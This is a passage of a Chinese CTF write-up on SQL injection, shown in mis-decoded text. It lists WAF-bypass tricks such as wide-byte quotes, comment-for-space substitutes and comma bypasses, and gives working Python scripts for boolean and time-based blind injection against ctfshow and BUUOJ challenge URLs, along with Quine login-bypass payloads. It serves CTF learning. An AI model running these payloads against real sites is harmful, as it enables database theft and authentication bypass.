<li>åŒå†™ç»•è¿‡<br>è¿™ä¸ªç»•è¿‡æ–¹æ³•ï¼Œåœ¨å…¶ä»–é¢˜ç›®ä¸­ä¹Ÿå¾ˆå¸¸ç”¨ã€‚ é¢˜ç›®çš„è¿‡æ»¤é€»è¾‘æ˜¯æŠŠé»‘åå•ä¸­å‡ºç°çš„å­—ç¬¦æ›¿æ¢æˆç©ºç™½ æ¯”å¦‚è¿‡æ»¤äº†union å¦‚æœå†™ ununionionï¼Œä¸­é—´çš„unionä¼šè¢«åˆ é™¤ï¼Œä½†æ˜¯å‰©ä½™çš„unionå°±æˆåŠŸç»•è¿‡äº†</li>
<li>ç¼–ç ç»•è¿‡<br>å¸¸è§çš„æœ‰åå…­è¿›åˆ¶ç¼–ç å’Œasciiç  ä¾‹å¦‚ <code>select * from users where username = 0x7465737431;</code> Testç­‰ä»·äº<code>CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</code></li>
<li>ç©ºæ ¼è¿‡æ»¤<br><code>/**/  ()   å›è½¦(%0a)   åå¼•å·%60  tab  åŒç©ºæ ¼</code></li>
<li>or and xor not</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="INI"><figure class="iseeu highlight /ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">and</span> = &amp;&amp;</span><br><span class="line"><span class="attr">or</span> = || </span><br><span class="line"><span class="attr">xor</span> = |</span><br><span class="line"><span class="attr">not</span> = !</span><br></pre></td></tr></table></figure></div>
<p>æ³¨æ„æœ‰äº›sqlä¸­çš„|| ä¼šæ ¹æ®sql_modeè®¾ç½®æˆå­—ç¬¦ä¸²çš„æ‹¼æ¥ <code>set sql_mode=PIPES_AS_CONCAT</code> , é»˜è®¤æƒ…å†µä¸‹å°±æ˜¯å½“ä½œé€»è¾‘è¿ç®—ç¬¦</p>
<ul>
<li>&#x3D;</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AXAPTA"><figure class="iseeu highlight /axapta"><table><tr><td class="code"><pre><span class="line">ç”¨<span class="keyword">like</span>ç»•è¿‡ `<span class="number">1</span> <span class="keyword">like</span> <span class="number">1</span>` </span><br><span class="line">rlike ä½œç”¨å’Œ<span class="keyword">like</span>å·®ä¸å¤šï¼Œéƒ½æ˜¯æ¨¡ç³ŠæŸ¥è¯¢</span><br><span class="line">regexp mysqlä¸­ç”¨regexpæ¥è¿›è¡Œæ­£åˆ™åŒ¹é…</span><br><span class="line">ç”¨å¤§äºå°äºå·ç»•è¿‡  å¦‚<span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> id &gt; <span class="number">1</span> and id &lt; <span class="number">3</span>;</span><br><span class="line">!&lt;&gt;   <span class="meta">#&lt;&gt;ç›¸å½“äº!= å‰é¢å†åŠ !å°±æ˜¯=äº†</span></span><br></pre></td></tr></table></figure></div>
<ul>
<li>å¤§å°äºå·<br>greatest(n1, n2, n3â€¦):è¿”å›nä¸­çš„æœ€å¤§å€¼  least(n1,n2,n3â€¦):è¿”å›nä¸­çš„æœ€å°å€¼  strcmp å¦‚æœç›¸åŒè¿”å›0ï¼Œå’Œcè¯­è¨€ä¸€æ ·<br>in å¦‚<code> select * from users where id = 1 and substr(username,1,1) in (&#39;t&#39;);</code><br>between â€˜câ€™ and â€˜câ€™ å¦‚<code>select * from users where id = 1 and substr(username,1,1) between &#39;t&#39; and &#39;t&#39;;</code></li>
<li>å¼•å·<br>1 åå…­è¿›åˆ¶  <code>select column_name  from information_schema.tables where table_name=0x7573657273;</code><br>2 å®½å­—èŠ‚  åœ¨webåº”ç”¨ä½¿ç”¨çš„å­—ç¬¦é›†ä¸ºGBKæ—¶ï¼Œå¹¶ä¸”è¿‡æ»¤äº†å¼•å·ï¼Œå°±å¯ä»¥è¯•è¯•å®½å­—èŠ‚ã€‚<br><code>%bf%27 %df%27 %aa%27</code>  %27æ˜¯å•å¼•å·çš„urlç¼–ç   å› ä¸ºåœ¨è¿‡æ»¤çš„æ—¶å€™ä¸€èˆ¬å•å¼•å·è¢«è¿‡æ»¤è¿‡æ»¤æˆ<code>\</code>ä½†æ˜¯%bfè¿™äº›å•å­—èŠ‚å­—ç¬¦å¯ä»¥å’Œ<code>\</code>ç»„åˆæˆä¸€ä¸ªåˆæ³•çš„å®½å­—ç¬¦ï¼Œä»è€ŒæŠŠå•å¼•å·é‡Šæ”¾å‡ºæ¥ æ¯”å¦‚<code>%df\â€™ = %df%5c%27=ç¸—â€™</code> %dfå°±å’Œ<code>\</code>ç»“åˆæˆç¸— ç„¶ååé¢çš„å•å¼•å·å°±é‡Šæ”¾å‡ºæ¥äº†</li>
<li>é€—å·<br>1 from for<br>ä¸€èˆ¬åœ¨sqlç›²æ³¨ä¸­ï¼Œéƒ½è¦ç”¨åˆ°substrè¿™ç§å‡½æ•°ï¼Œå¦‚æœé€—å·è¢«è¿‡æ»¤ï¼Œå¯ä»¥ç”¨from for<br>æ¯”å¦‚ <code>select substr(&quot;string&quot;,1,3)</code> ä¸¤ä¸ªå‚æ•°åˆ†åˆ«æ˜¯èµ·å§‹ä½ç½®å’Œé•¿åº¦ï¼Œè¿™å¥å¯ä»¥ç­‰ä»·ä¸º<code>select substr(&quot;string&quot; from 1 for 3)</code></li>
</ul>
<p>2 join<br>åœ¨ SQL ä¸­ï¼ŒJOIN ç”¨äºå°†å¤šä¸ªè¡¨ä¸­çš„æ•°æ®è¿›è¡Œç»„åˆã€‚å½“ä½¿ç”¨ JOIN è¿æ¥å¤šä¸ªåªæœ‰ä¸€è¡Œæ•°æ®çš„è¡¨æ—¶ï¼Œä¼šå°†è¿™äº›è¡¨çš„æ•°æ®è¿›è¡Œäº¤å‰ç»„åˆã€‚<br>æ¯”å¦‚<code>union select * from (select 1)a join (select 2)b join(select 3)c</code> å°±ç›¸å½“äº<code>union select 1,2,3</code></p>
<p>3 offset<br>ç”¨äºç»•è¿‡limitä¸­çš„é€—å· <code>limit 2,1</code>ç­‰ä»·äº<code>limit 1 offset 2</code></p>
<ul>
<li>è¿‡æ»¤å‡½æ•°<br>sleep() â€“&gt;benchmark()  ï¼Œ è¿™ä¸ªå‡½æ•°å®ƒä¼šé‡å¤æ‰§è¡ŒæŒ‡å®šçš„è¡¨è¾¾å¼è‹¥å¹²æ¬¡ï¼Œä»¥æ­¤æ¥è¯„ä¼°æ€§èƒ½ã€‚ å¦‚ä½¿ç”¨<code>select 12,23 and benchmark(1000000000,1);</code>è¿™æ ·å­é‡å¤æ‰§è¡Œï¼Œä¸­é—´çš„æ—¶é—´ä¹Ÿå¯ä»¥å½“ä½œç¡çœ æ—¶é—´äº†<br>ascii()â€“&gt;hex()ã€bin()<br>group_concat()â€“&gt;concat_ws()  concat_wsç¬¬ä¸€ä¸ªå‚æ•°è¦æŒ‡å®šåˆ†éš”ç¬¦ å¦‚<code> select concat_ws(&quot;,&quot;,&quot;str1&quot;,&quot;str2&quot;);</code><br>substr(),substring(),mid()å¯ä»¥ç›¸äº’å–ä»£, å–å­ä¸²çš„å‡½æ•°è¿˜æœ‰left(),right()<br>user() â€“&gt; @@userã€datadirâ€“&gt;@@datadir<br>ord()â€“&gt;ascii():è¿™ä¸¤ä¸ªå‡½æ•°åœ¨å¤„ç†è‹±æ–‡æ—¶æ•ˆæœä¸€æ ·ï¼Œä½†æ˜¯å¤„ç†ä¸­æ–‡ç­‰æ—¶ä¸ä¸€è‡´ã€‚</li>
<li>information.schema.tables<br>å…¶å®mysqlçš„ç³»ç»Ÿè¡¨ä¸­æœ‰å¾ˆå¤šå’Œinformation.schemaä¸€æ ·åŠŸèƒ½çš„è¡¨<br>sys.schema_table_statistics_with_buffer å¯ä»¥æ›¿ä»£information.schema.tables</li>
</ul>
<h1 id="sqlç›²æ³¨"><a href="#sqlç›²æ³¨" class="headerlink" title="sqlç›²æ³¨"></a>sqlç›²æ³¨</h1><p>sqlç›²æ³¨ç®€å•æ¥è¯´å°±æ˜¯æŸ¥è¯¢çš„åˆ°çš„ä¿¡æ¯ä¸ä¼šç›´æ¥å›æ˜¾ï¼Œæ‰€ä»¥ç§°ä¸ºâ€ç›²æ³¨â€ã€‚ é€šå¸¸åˆ©ç”¨æ˜¯è§‚å¯Ÿé¡µé¢ç½‘é¡µçš„ä¸åŒå’Œå“åº”æ—¶é—´æ¥åˆ¤æ–­æ˜¯å¦æˆåŠŸæ³¨å…¥ï¼Œæ¯”å¦‚ä½ çš„è¯­å¥æ­£ç¡®é¡µé¢å‡ºç°welcome user ï¼Œå¦‚æœé”™è¯¯å°±æ²¡æœ‰æ˜¾ç¤ºï¼Œæˆ–è€…åœ¨è¯­å¥åé¢ä¸ä¸€ä¸ªsleepï¼Œè¿™æ ·å½“è¯­å¥æ­£ç¡®æ—¶å€™ä¼šæœ‰æ›´å¤šçš„è¿”å›æ—¶é—´ã€‚é€šè¿‡è¿™äº›å“åº”çš„å·®å¼‚ï¼Œå¯ä»¥å¾—åˆ°æƒ³è¦çš„ä¿¡æ¯ã€‚</p>
<h2 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h2><p>å¸ƒå°”ç›²æ³¨å°±æ˜¯åˆ©ç”¨è¯­å¥çš„çœŸå‡ï¼Œé¡µé¢ä¼šæœ‰ä¸åŒçš„å“åº”ã€‚å¸¸ç”¨åˆ°ä¸‹é¢å‡ ä¸ªå‡½æ•°<br>mid(str,start,length): æˆªå–å­—ç¬¦ä¸²  ord(): è½¬æ¢æˆasciiç    length(): è·å–é•¿åº¦<br>é€šè¿‡é¢˜ç›®æ¥å­¦ä¹ payloadè„šæœ¬</p>
<h3 id="ä¾‹é¢˜-ctfshow-web8"><a href="#ä¾‹é¢˜-ctfshow-web8" class="headerlink" title="ä¾‹é¢˜ ctfshow web8"></a>ä¾‹é¢˜ ctfshow web8</h3><p><img src="https://pic1.imgdb.cn/item/67ff206d88c538a9b5d2645b.png"><br>è¿›å…¥ç¯å¢ƒä¹‹åï¼Œå¯ä»¥é€‰æ‹©æ–‡ç« ï¼Œç„¶åé€šè¿‡urlçœ‹å‡ºè¿™é‡Œæ˜¯é€šè¿‡idæ¥æŸ¥è¯¢çš„ï¼Œå­˜åœ¨sqlæ³¨å…¥<br>è¿™é‡Œæ˜¯æ•°å­—å‹æ³¨å…¥<br>å°è¯•é—­åˆï¼Œé¡µé¢è¿”å›sql inject errorï¼Œå½“è¾“å…¥wafçš„æ—¶å€™å°±å‡ºç°è¿™ä¸ªã€‚ ä½†æ˜¯å½“è¾“å…¥ä¸ºçœŸçš„æ—¶å€™ é¡µé¢è¿”å›æ‰€æœ‰æ–‡ç« çš„å†…å®¹ï¼Œæ‰€ä»¥å°±æ ¹æ®è¿™ä¸ªå·®å¼‚æ¥å†™åŸºäºå¸ƒå°”ç›²æ³¨çš„è„šæœ¬<br>ç”¨bpè·‘ä¸€ä¸‹sqlçš„ç»•è¿‡ è¿™é‡Œè¿”å›é•¿åº¦æ˜¯972çš„æ˜¯è¿‡æ»¤çš„<br><img src="https://pic1.imgdb.cn/item/6803105788c538a9b5dd0d8f.png"><br>è¿‡æ»¤äº†unionå’Œé€—å·ï¼Œé€—å·å¯ä»¥ç”¨from for è¿‡æ»¤</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¦ç”¨ä¸å®‰å…¨è¯·æ±‚è­¦å‘Šï¼ˆå¯é€‰ï¼‰</span></span><br><span class="line">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">base_url = <span class="string">&#x27;https://fade2207-6d75-4b6b-90fb-1dd9463cc58b.challenge.ctf.show/index.php&#x27;</span></span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):  <span class="comment"># å‡è®¾æ•°æ®åº“åæœ€é•¿ 50ä½</span></span><br><span class="line">    low, high = <span class="number">32</span>, <span class="number">127</span> </span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">       </span><br><span class="line">        <span class="comment">#payload = f&quot;0/**/or/**/ascii(substr((select/**/database())from/**/&#123;i&#125;/**/for/**/1))/**/&gt;/**/&#123;mid&#125;#&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;0/**/or/**/ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/&#123;i&#125;/**/for/**/1))/**/&gt;/**/&#123;mid&#125;#&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&#x27;0/**/or/**/ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&quot;flag&quot;)from/**/&#123;i&#125;/**/for/**/1))/**/&gt;/**/&#123;mid&#125;#&#x27;</span></span><br><span class="line">        payload = <span class="string">f&#x27;0/**/or/**/ascii(substr((select/**/group_concat(flag)/**/from/**/flag)from/**/<span class="subst">&#123;i&#125;</span>/**/for/**/1))/**/&gt;/**/<span class="subst">&#123;mid&#125;</span>#&#x27;</span></span><br><span class="line"></span><br><span class="line">        url = <span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span>?id=<span class="subst">&#123;payload&#125;</span>&quot;</span>  </span><br><span class="line">        r = s.get(url, verify=<span class="literal">False</span>)</span><br><span class="line">        </span><br><span class="line">       </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;If&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid + <span class="number">1</span>  </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid     </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> low &lt;= <span class="number">126</span>:  </span><br><span class="line">        ans += <span class="built_in">chr</span>(low)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] ç¬¬ <span class="subst">&#123;i&#125;</span> ä½å­—ç¬¦: <span class="subst">&#123;<span class="built_in">chr</span>(low)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;final: <span class="subst">&#123;ans&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>
<p>åˆ†åˆ«å¾—åˆ°æ•°æ®åº“ web8  æ•°æ®è¡¨ flag å­—æ®µ  flag</p>
<h2 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h2><p>è¯­å¥åé¢åŠ ä¸Šæ¡ä»¶åˆ¤æ–­çš„sleepè¯­å¥ï¼Œå¦‚æœé¡µé¢ç¡®å®èŠ±äº†æ—¶é—´å»¶è¿Ÿï¼Œè¯´æ˜æ¡ä»¶æ˜¯æˆç«‹çš„<br>å¦‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line">&#x27; <span class="keyword">and</span> sleep(<span class="keyword">if</span>((<span class="built_in">length</span>(database()) = <span class="number">8</span>),<span class="number">0</span>,<span class="number">5</span>))<span class="comment">--+  # å¦‚æœæ•°æ®åº“çš„é•¿åº¦ä¸º8ï¼Œå»¶è¿Ÿæ—¶é—´ä¸º0ï¼Œå¦åˆ™å»¶è¿Ÿ5ç§’</span></span><br></pre></td></tr></table></figure></div>
<p>è¿˜æœ‰ä¸€ä¸ªå‡½æ•°<code>select case when</code> ä¾‹å¦‚<code>select case when x then y else z end from user;</code><br>è¿™ä¸ªè¯­å¥çš„æ„æ€å°±æ˜¯å½“xæˆç«‹çš„æ—¶å€™æ‰§è¡Œyï¼Œä¸æˆç«‹å°±æ‰§è¡Œz åœ¨userä¸­æŸ¥è¯¢</p>
<p>payloadå¯ä»¥ç”¨ä¸Šé¢çš„ä¸€ä¸ªè„šæœ¬æ¥è¯´æ˜</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://39ea5cde-01c9-4eea-af04-eae901e2bded.node5.buuoj.cn:81/index.php?r=Login/Index&#x27;</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="string">&quot;admin&#x27;; set @a=0x&#123;0&#125;;prepare kakeru from @a;execute kakeru#&quot;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str_to_hex</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">hex</span>(<span class="built_in">ord</span>(o)).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> o <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">32</span>):</span><br><span class="line">    payload = <span class="string">&quot;select if(ascii(substr(select flag from flag),&#123;0&#125;,1)=&#123;1&#125;,sleep(3),1)&quot;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">        data = &#123;<span class="string">&#x27;username&#x27;</span>:payloads.<span class="built_in">format</span>(str_to_hex(payload.<span class="built_in">format</span>(i,j))),<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>&#125;</span><br><span class="line">        data = json.dumps(data)</span><br><span class="line">        times = time.time()</span><br><span class="line">        res = requests.post(url = url,data = data)</span><br><span class="line">        <span class="keyword">if</span> (time.time() - times &gt;= <span class="number">3</span>):</span><br><span class="line">            flag += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>
<p>åˆ©ç”¨æ¡ä»¶æˆç«‹çš„æ—¶å€™è§¦å‘å»¶è¿Ÿæ¥å¾—åˆ°flag</p>
<h1 id="Quineæ³¨å…¥"><a href="#Quineæ³¨å…¥" class="headerlink" title="Quineæ³¨å…¥"></a>Quineæ³¨å…¥</h1><p>Quineåˆå«åšè‡ªäº§ç”Ÿç¨‹åºï¼Œåœ¨sqlæ³¨å…¥æŠ€æœ¯ä¸­ï¼Œè¿™æ˜¯ä¸€ç§ä½¿å¾—è¾“å…¥çš„sqlè¯­å¥å’Œè¾“å‡ºçš„sqlè¯­å¥ä¸€è‡´çš„æŠ€æœ¯ï¼Œå¸¸ç”¨äºä¸€äº›ç‰¹æ®Šçš„ç™»é™†ç»•è¿‡sqlæ³¨å…¥ä¸­ã€‚<br>å¯ä»¥çœ‹è¿™ä¸¤ç¯‡æ–‡ç« æ¥å­¦ä¹ è¿™ç§æ¼æ´<br><a href="https://www.anquanke.com/post/id/253570">ä»ä¸‰é“èµ›é¢˜å†è°ˆQuine trick</a>  <a href="https://blog.csdn.net/weixin_53090346/article/details/125531088">SQLæ³¨å…¥ä¹‹Quineæ³¨å…¥</a><br>è¿™ç§é¢˜ç›®ä¸€èˆ¬ä¼šç»™å‡ºæºç ï¼Œ ç„¶åç›²æ³¨å‡ºæ¥çš„è¡¨æ˜¯ä¸ªç©ºè¡¨ï¼Œä¸ºäº†è®©password &#x3D; â€˜$passwordâ€™ å°±è¦ç”¨quineæ³¨å…¥<br>é¦–å…ˆè¦çŸ¥é“replaceå‡½æ•°çš„ä¸‰ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¦æ›¿æ¢çš„æ•´ä¸ªå­—ç¬¦ä¸²ï¼Œç¬¬äºŒä¸ªå‚æ•°è¢«æ›¿æ¢çš„å­—ç¬¦(ä¸²) ï¼Œç¬¬ä¸‰ä¸ªæ˜¯è¦æ›¿æ¢æˆçš„å­—ç¬¦(ä¸²)<br>å­¦ä¹ payload :<br>ä¸è€ƒè™‘å¼•å· </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="EXCEL"><figure class="iseeu highlight /excel"><table><tr><td class="code"><pre><span class="line">è¾“å…¥ï¼š <span class="built_in">replace</span>(&#x27;<span class="built_in">replace</span>(<span class="string">&quot;.&quot;</span>,<span class="built_in">char</span>(<span class="number">46</span>),<span class="string">&quot;.&quot;</span>)&#x27;,<span class="built_in">char</span>(<span class="number">46</span>),&#x27;<span class="built_in">replace</span>(<span class="string">&quot;.&quot;</span>,<span class="built_in">char</span>(<span class="number">46</span>),<span class="string">&quot;.&quot;</span>)&#x27;);</span><br><span class="line">è¾“å‡ºï¼š <span class="built_in">replace</span>(<span class="string">&quot;replace(&quot;</span>.<span class="string">&quot;,char(46),&quot;</span>.<span class="string">&quot;)&quot;</span>,<span class="built_in">char</span>(<span class="number">46</span>),<span class="string">&quot;replace(&quot;</span>.<span class="string">&quot;,char(46),&quot;</span>.<span class="string">&quot;)&quot;</span>) ;</span><br></pre></td></tr></table></figure></div>
<p>ä¸ºäº†å»æ‰å¼•å·  <code>REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)</code><br>å®Œæˆçš„payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STATA"><figure class="iseeu highlight /stata"><table><tr><td class="code"><pre><span class="line">è¾“å…¥ï¼š  <span class="keyword">replace</span>(<span class="keyword">replace</span>(&#x27;<span class="keyword">replace</span>(<span class="keyword">replace</span>(<span class="string">&quot;.&quot;</span>,<span class="built_in">char</span>(34),<span class="built_in">char</span>(39)),<span class="built_in">char</span>(46),<span class="string">&quot;.&quot;</span>)&#x27;,<span class="built_in">char</span>(34),<span class="built_in">char</span>(39)),<span class="built_in">char</span>(46),&#x27;<span class="keyword">replace</span>(<span class="keyword">replace</span>(<span class="string">&quot;.&quot;</span>,<span class="built_in">char</span>(34),<span class="built_in">char</span>(39)),<span class="built_in">char</span>(46),<span class="string">&quot;.&quot;</span>)&#x27;);</span><br><span class="line"></span><br><span class="line">è¾“å‡ºï¼š <span class="keyword">replace</span>(<span class="keyword">replace</span>(&#x27;<span class="keyword">replace</span>(<span class="keyword">replace</span>(<span class="string">&quot;.&quot;</span>,<span class="built_in">char</span>(34),<span class="built_in">char</span>(39)),<span class="built_in">char</span>(46),<span class="string">&quot;.&quot;</span>)&#x27;,<span class="built_in">char</span>(34),<span class="built_in">char</span>(39)),<span class="built_in">char</span>(46),&#x27;<span class="keyword">replace</span>(<span class="keyword">replace</span>(<span class="string">&quot;.&quot;</span>,<span class="built_in">char</span>(34),<span class="built_in">char</span>(39)),<span class="built_in">char</span>(46),<span class="string">&quot;.&quot;</span>)&#x27;);</span><br></pre></td></tr></table></figure></div>
<p>å¦‚æœcharè¢«è¿‡æ»¤å¯ä»¥ç”¨chræˆ–è€…0x  char(34) â€”&gt; 0x22  char(39) â€“&gt; 0x27</p>
<p>è¿™é‡Œè®°å½•ä¸‹ä¸€äº›é¢˜ç›®çš„payload</p>
<p>1. </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="OPENSCAD"><figure class="iseeu highlight /openscad"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;<span class="comment">/**/</span><span class="built_in">union</span><span class="comment">/**/</span>select<span class="comment">/**/</span>replace(replace(&#x27;<span class="number">1</span><span class="string">&quot;/**/union/**/select/**/replace(replace(&quot;</span>.<span class="string">&quot;,chr(34),chr(39)),chr(46),&quot;</span>.<span class="string">&quot;)#&#x27;,chr(34),chr(39)),chr(46),&#x27;1&quot;</span><span class="comment">/**/</span><span class="built_in">union</span><span class="comment">/**/</span>select<span class="comment">/**/</span>replace(replace(<span class="string">&quot;.&quot;</span>,<span class="built_in">chr</span>(<span class="number">34</span>),<span class="built_in">chr</span>(<span class="number">39</span>)),<span class="built_in">chr</span>(<span class="number">46</span>),<span class="string">&quot;.&quot;</span>)#&#x27;)#</span><br></pre></td></tr></table></figure></div>
<p>ç»“æ„</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LISP"><figure class="iseeu highlight /lisp"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;/**/union/**/select/**/replace(</span><br><span class="line">    <span class="name">replace</span>(</span><br><span class="line">        &#x27;payloadå­—ç¬¦ä¸²&#x27;,</span><br><span class="line">        chr(<span class="number">34</span>), chr(<span class="number">39</span>)</span><br><span class="line">    ),</span><br><span class="line">    chr(<span class="number">46</span>),</span><br><span class="line">    &#x27;payloadå­—ç¬¦ä¸²&#x27;</span><br><span class="line">)# </span><br></pre></td></tr></table></figure></div>

<h1 id="äºŒé˜¶æ³¨å…¥"><a href="#äºŒé˜¶æ³¨å…¥" class="headerlink" title="äºŒé˜¶æ³¨å…¥"></a>äºŒé˜¶æ³¨å…¥</h1><p>ä¸€é˜¶æ³¨å…¥å°±æ˜¯æ™®é€šçš„sqlæ³¨å…¥</p>
<p>äºŒé˜¶æ³¨å…¥å°±æ˜¯æ— æ³•ç›´æ¥æ³¨å…¥ï¼Œå®ƒæ—¶æŒ‡å·²å­˜å‚¨ï¼ˆæ•°æ®åº“ã€æ–‡ä»¶ï¼‰çš„ç”¨æˆ·è¾“å…¥è¢«è¯»å–åå†æ¬¡è¿›å…¥åˆ° SQL æŸ¥è¯¢è¯­å¥ä¸­å¯¼è‡´çš„æ³¨å…¥ã€‚</p>
<p>æ³¨å…¥æ¯”è¾ƒ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">ä¸€é˜¶<span class="keyword">SQL</span>æ³¨å…¥ï¼š</span><br><span class="line">ã€€ã€€ã€€ã€€ã€€ã€€<span class="number">1</span>ï¼›ä¸€é˜¶<span class="keyword">SQL</span>æ³¨å…¥å‘ç”Ÿåœ¨ä¸€ä¸ªHTTPè¯·æ±‚å’Œå“åº”ä¸­ï¼Œå¯¹ç³»ç»Ÿçš„æ”»å‡»æ˜¯ç«‹å³æ‰§è¡Œçš„ï¼›</span><br><span class="line">ã€€ã€€ã€€ã€€ã€€ã€€<span class="number">2</span>ï¼›æ”»å‡»è€…åœ¨httpè¯·æ±‚ä¸­æäº¤éæ³•è¾“å…¥ï¼›</span><br><span class="line">ã€€ã€€ã€€ã€€ã€€ã€€<span class="number">3</span>ï¼›åº”ç”¨ç¨‹åºå¤„ç†éæ³•è¾“å…¥ï¼Œä½¿ç”¨éæ³•è¾“å…¥æ„é€ <span class="keyword">SQL</span>è¯­å¥ï¼›</span><br><span class="line">ã€€ã€€ã€€ã€€ã€€ã€€<span class="number">4</span>ï¼›åœ¨æ”»å‡»è¿‡ç¨‹ä¸­å‘æ”»å‡»è€…è¿”å›ç»“æœã€‚</span><br><span class="line">äºŒé˜¶<span class="keyword">SQL</span>æ³¨å…¥ï¼š</span><br><span class="line">ã€€ã€€ã€€ã€€ã€€ã€€<span class="number">1</span>ï¼›æ”»å‡»è€…åœ¨httpè¯·æ±‚ä¸­æäº¤æ¶æ„è¾“å…¥ï¼›</span><br><span class="line">ã€€ã€€ã€€ã€€ã€€ã€€<span class="number">2</span>ï¼›æ¶æ„è¾“å…¥ä¿å­˜åœ¨æ•°æ®åº“ä¸­ï¼›</span><br><span class="line">ã€€ã€€ã€€ã€€ã€€ã€€<span class="number">3</span>ï¼›æ”»å‡»è€…æäº¤ç¬¬äºŒæ¬¡httpè¯·æ±‚ï¼›</span><br><span class="line">ã€€ã€€ã€€ã€€ã€€ã€€<span class="number">4</span>ï¼›ä¸ºå¤„ç†ç¬¬äºŒæ¬¡httpè¯·æ±‚ï¼Œç¨‹åºåœ¨æ£€ç´¢å­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„æ¶æ„è¾“å…¥ï¼Œæ„é€ <span class="keyword">SQL</span>è¯­å¥ï¼›</span><br><span class="line">ã€€ã€€ã€€ã€€ã€€ã€€<span class="number">5</span>ï¼›å¦‚æœæ”»å‡»æˆåŠŸï¼Œåœ¨ç¬¬äºŒæ¬¡è¯·æ±‚å“åº”ä¸­è¿”å›ç»“æœã€‚</span><br><span 